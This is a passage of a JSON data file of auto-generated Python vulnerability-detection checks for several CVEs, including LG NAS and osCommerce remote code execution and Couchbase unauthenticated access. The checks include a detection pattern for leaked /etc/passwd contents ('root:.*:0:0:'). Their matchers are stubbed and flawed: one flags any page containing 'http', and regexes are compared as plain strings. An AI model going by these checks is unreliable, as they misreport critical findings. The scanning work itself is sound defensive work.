        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2018-10818\nName: LG NAS Devices - Remote Code Execution\nSeverity: critical\nDescription: LG NAS devices contain a pre-auth remote command injection via the \"password\" parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2018_10818:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2018-10818\"\n    SEVERITY = \"critical\"\n    NAME = \"LG NAS Devices - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'User-Agent: {{useragent}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'User-Agent: {{useragent}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"LG NAS Devices - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2018_10818(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2018-10818"
        ],
        "tags": [
          "cve",
          "cve2018",
          "lg-nas",
          "rce",
          "oast",
          "injection",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2018_25114",
        "name": "osCommerce 2.3.4.1 - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "osCommerce Online Merchant 2.3.4.1 contains a remote code execution caused by insecure default configuration and missing authentication in the installer workflow, letting unauthenticated attackers execute arbitrary PHP code via install_4.php, exploit requires accessible /install/ directory after installation.",
        "severity": "critical",
        "detection": "[AND] regex ['root:.*:0:0:'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2018-25114\nName: osCommerce 2.3.4.1 - Remote Code Execution\nSeverity: critical\nDescription: osCommerce Online Merchant 2.3.4.1 contains a remote code execution caused by insecure default configuration and missing authentication in the installer workflow, letting unauthenticated attackers execute arbitrary PHP code via install_4.php, exploit requires accessible /install/ directory after installation.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2018_25114:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2018-25114\"\n    SEVERITY = \"critical\"\n    NAME = \"osCommerce 2.3.4.1 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"osCommerce 2.3.4.1 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2018_25114(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2018-25114\nName: osCommerce 2.3.4.1 - Remote Code Execution\nSeverity: critical\nDescription: osCommerce Online Merchant 2.3.4.1 contains a remote code execution caused by insecure default configuration and missing authentication in the installer workflow, letting unauthenticated attackers execute arbitrary PHP code via install_4.php, exploit requires accessible /install/ directory after installation.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2018_25114:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2018-25114\"\n    SEVERITY = \"critical\"\n    NAME = \"osCommerce 2.3.4.1 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"osCommerce 2.3.4.1 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2018_25114(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2018-25114"
        ],
        "tags": [
          "cve",
          "cve2018",
          "rce",
          "oscommerce",
          "edb",
          "vuln",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2020_9039",
        "name": "Couchbase Server - Broken Access Control",
        "language": "Python",
        "famille": "CVE",
        "description": "Couchbase Server versions 4.0.0, 4.1.0, 4.1.1, 4.5.0, 4.5.1, 4.6.0-4.6.5, 5.0.0, 5.1.1, 5.5.0, and 5.5.1 contain insecure permissions for the projector and indexer REST endpoints caused by unauthenticated access, letting attackers access administrative APIs without authentication, exploit requires no special conditions.",
        "severity": "critical",
        "detection": "[AND] DSL: status_code == 200; contains_any(body, 'indexer.settings','projector.settings','max_seckey_size')",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2020-9039\nName: Couchbase Server - Broken Access Control\nSeverity: critical\nDescription: Couchbase Server versions 4.0.0, 4.1.0, 4.1.1, 4.5.0, 4.5.1, 4.6.0-4.6.5, 5.0.0, 5.1.1, 5.5.0, and 5.5.1 contain insecure permissions for the projector and indexer REST endpoints caused by unauthenticated access, letting attackers access administrative APIs without authentication, exploit requires no special conditions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2020_9039:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2020-9039\"\n    SEVERITY = \"critical\"\n    NAME = \"Couchbase Server - Broken Access Control\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code == 200; contains_any(body, 'indexer.settings','projector.settings','max_seckey_size')\"\n\n        # Simple word matcher simulation\n        matchers = ['indexer.settings', 'projector.settings', 'max_seckey_size']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Couchbase Server - Broken Access Control\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2020_9039(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2020-9039\nName: Couchbase Server - Broken Access Control\nSeverity: critical\nDescription: Couchbase Server versions 4.0.0, 4.1.0, 4.1.1, 4.5.0, 4.5.1, 4.6.0-4.6.5, 5.0.0, 5.1.1, 5.5.0, and 5.5.1 contain insecure permissions for the projector and indexer REST endpoints caused by unauthenticated access, letting attackers access administrative APIs without authentication, exploit requires no special conditions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2020_9039:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2020-9039\"\n    SEVERITY = \"critical\"\n    NAME = \"Couchbase Server - Broken Access Control\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code == 200; contains_any(body, 'indexer.settings','projector.settings','max_seckey_size')\"\n\n        # Simple word matcher simulation\n        matchers = ['indexer.settings', 'projector.settings', 'max_seckey_size']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Couchbase Server - Broken Access Control\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2020_9039(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2020",
          "couchbase",
          "unauth"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2021_28073",
        "name": "Ntopng Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "Ntopng, a passive network monitoring tool, contains an authentication bypass vulnerability in ntopng <= 4.2",
        "severity": "critical",
        "detection": "[AND] mot(s) 'application/json' | mot(s) '\"results\":, \"name\":, \"tab\":' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
